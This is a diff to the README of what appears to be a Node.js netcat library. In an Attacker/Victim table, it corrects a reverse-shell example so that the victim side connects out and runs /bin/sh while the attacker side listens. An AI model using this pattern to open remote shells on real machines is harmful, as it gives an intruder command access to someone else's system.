@@ -100,9 +100,9 @@ The `exec()` method execute the given command and pipe together his `stdout` and
 
 | Attacker              | Victim                           |
 |---------------------|------------------------------------|
-|`nc.port(2389).listen().exec('/bin/sh')`|`process.stdin.pipe(nc2.port(2389).retry(5000).connect().pipe(process.stdout))`|
+|`nc.port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.port(2389).retry(5000).connect().exec('/bin/sh')`|
 
-TODO...
+TODO... Improvement: pipe only on a specific socketId.
 
 #### Netcat as a proxy
 
